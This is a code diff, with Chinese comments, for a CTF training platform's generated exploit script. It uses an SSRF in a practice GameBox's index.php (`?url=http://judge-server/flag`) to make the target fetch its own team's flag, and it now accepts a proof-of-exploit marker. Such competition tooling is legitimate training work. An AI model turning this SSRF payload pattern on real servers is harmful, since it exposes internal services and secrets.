@@ -229,12 +229,14 @@ fn write_awdp_exploit_py(awdp_dir: &std::path::Path) -> Result<()> {
 --------
 1. test_g 的 `index.php` 存在 SSRF：`?url=<address>` 会令服务端 PHP curl 任意地址，
    响应原样回显。
-2. 平台部署 GameBox 时通过 `extra_hosts` 注入 `flagserver` 主机名
-   （指向本赛事 FlagServer），且攻击阶段防火墙放行 gamebox → flagserver。
-3. FlagServer 的 `GET /flag` 按 TCP 源 IP 识别请求方 GameBox，返回该 GameBox
-   当前轮次的确定性 flag（同 gamebox + 同 round = 同 flag）。
-4. 因此让**目标 GameBox** 发起 `http://flagserver/flag` 请求，源 IP 即目标
-   GameBox，FlagServer 返回目标战队的 flag，经 SSRF 回显给攻击者。
+2. 平台部署 GameBox 时在 data 网络内注入 `judge-server` 主机名（指向练习
+   JudgeServer data plane），GameBox 可直连。
+3. `GET /flag` 按 TCP 源 IP 识别请求方 GameBox：Break 阶段返回该 GameBox 的
+   确定性真实 flag；练习 Fix 阶段返回固定标记 `flag{proof-of-exploit}`
+   （漏洞仍可利用的证明，不泄露真实 flag）。
+4. 因此让**目标 GameBox** 发起 `http://judge-server/flag` 请求，源 IP 即目标
+   GameBox，经 SSRF 回显给攻击者；拿到真实 flag（Break）或
+   `flag{proof-of-exploit}`（练习 Fix）都代表服务可被攻破。
 
 支持一次传入多个目标 GameBox IP 并发攻击。
 
@@ -265,8 +267,8 @@ MAX_WORKERS = 32
 def exploit(target_ip: str) -> dict:
     """向单个目标 GameBox 的 SSRF 端点发起攻击，返回结果字典。"""
     result: dict = {"gamebox_ip": target_ip}
-    # SSRF：目标 GameBox 的 PHP 请求 flagserver/flag，
-    # TCP 源 IP = 目标 GameBox → FlagServer 发放目标战队 flag。
+    # SSRF：目标 GameBox 的 PHP 请求 judge-server/flag，
+    # TCP 源 IP = 目标 GameBox → judge-server 识别后回显 flag/标记。
     payload_url = f"http://{target_ip}/?url=http://judge-server/flag"
     try:
         with urllib.request.urlopen(payload_url, timeout=EXPLOIT_TIMEOUT_SECS) as resp:
@@ -276,7 +278,9 @@ def exploit(target_ip: str) -> dict:
         result["error"] = str(exc)
         return result
 
-    if body.startswith("flag{"):
+    # Break 阶段返回真实 flag；练习 Fix 阶段返回固定标记 flag{proof-of-exploit}
+    # （漏洞仍可利用）。二者都代表服务可被攻破。
+    if "flag{proof-of-exploit}" in body or body.startswith("flag{"):
         result["success"] = True
         result["flag"] = body
     else:
